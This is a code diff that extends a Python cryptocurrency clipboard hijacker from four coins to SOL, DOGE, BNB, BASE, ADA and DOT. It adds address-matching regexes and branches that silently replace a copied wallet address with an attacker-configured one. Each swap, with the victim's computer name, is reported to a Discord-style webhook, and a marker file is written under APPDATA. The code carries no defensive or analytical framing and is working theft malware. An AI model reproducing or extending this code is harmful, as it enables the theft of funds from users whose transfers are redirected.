@@ -13,6 +13,12 @@ btcaddr = "SET BTC ADDRESS HERE"
 ethaddr = "SET ETH ADDRESS HERE"
 ltcaddr = "SET LTC ADDRESS HERE"
 xmraddr = "SET XMR ADDRESS HERE"
+soladdr = "SET SOL ADDRESS HERE"
+dogeaddr = "SET DOGE ADDRESS HERE"
+bnbaddr = "SET BNB ADDRESS HERE"
+baseaddr = "SET BASE ADDRESS HERE"
+adaaddr = "SET ADA ADDRESS HERE"
+dotaddr = "SET DOT ADDRESS HERE"
 
 single_use = False
 
@@ -35,6 +41,13 @@ def is_crypto_addr(clipboard_text):
         eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
         ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
         xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
+        sol_address_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
+        doge_address_pattern = r"^D[5-9A-HJ-NP-Ua-km-z]{33,34}$"
+        bnb_address_pattern = r"^bnb1[0-9a-z]{38}$"
+        base_address_pattern = r"^0x[a-fA-F0-9]{40}$"
+        ada_address_pattern = r"^addr1[0-9a-z]{58,59}$"
+        dot_address_pattern = r"^1[a-km-zA-HJ-NP-Z1-9]{47}$"
+
         if re.match(btc_address_pattern, clipboard_text):
             return "BTC"
         elif re.match(eth_address_pattern, clipboard_text):
@@ -43,6 +56,18 @@ def is_crypto_addr(clipboard_text):
             return "LTC"
         elif re.match(xmr_address_pattern, clipboard_text):
             return "XMR"
+        elif re.match(sol_address_pattern, clipboard_text):
+            return "SOL"
+        elif re.match(doge_address_pattern, clipboard_text):
+            return "DOGE"
+        elif re.match(bnb_address_pattern, clipboard_text):
+            return "BNB"
+        elif re.match(base_address_pattern, clipboard_text):
+            return "BASE"
+        elif re.match(ada_address_pattern, clipboard_text):
+            return "ADA"
+        elif re.match(dot_address_pattern, clipboard_text):
+            return "DOT"
         else:
             return False
     except Exception:
@@ -155,6 +180,174 @@ def main():
                                 else:
                                     message = {
                                         "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
+            elif var == "SOL":
+                if soladdr != "SET SOL ADDRESS HERE":
+                    if clipboard_text != soladdr:
+                        pyperclip.copy(soladdr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
+            elif var == "DOGE":
+                if dogeaddr != "SET DOGE ADDRESS HERE":
+                    if clipboard_text != dogeaddr:
+                        pyperclip.copy(dogeaddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
+            elif var == "BNB":
+                if bnbaddr != "SET BNB ADDRESS HERE":
+                    if clipboard_text != bnbaddr:
+                        pyperclip.copy(bnbaddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected BNB address on {comp_name} - changed to {bnbaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected BNB address on {comp_name} - changed to {bnbaddr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
+            elif var == "BASE":
+                if baseaddr != "SET BASE ADDRESS HERE":
+                    if clipboard_text != baseaddr:
+                        pyperclip.copy(baseaddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected BASE address on {comp_name} - changed to {baseaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected BASE address on {comp_name} - changed to {baseaddr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
+            elif var == "ADA":
+                if adaaddr != "SET ADA ADDRESS HERE":
+                    if clipboard_text != adaaddr:
+                        pyperclip.copy(adaaddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected ADA address on {comp_name} - changed to {adaaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected ADA address on {comp_name} - changed to {adaaddr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
+            elif var == "DOT":
+                if dotaddr != "SET DOT ADDRESS HERE":
+                    if clipboard_text != dotaddr:
+                        pyperclip.copy(dotaddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected DOT address on {comp_name} - changed to {dotaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected DOT address on {comp_name} - changed to {dotaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
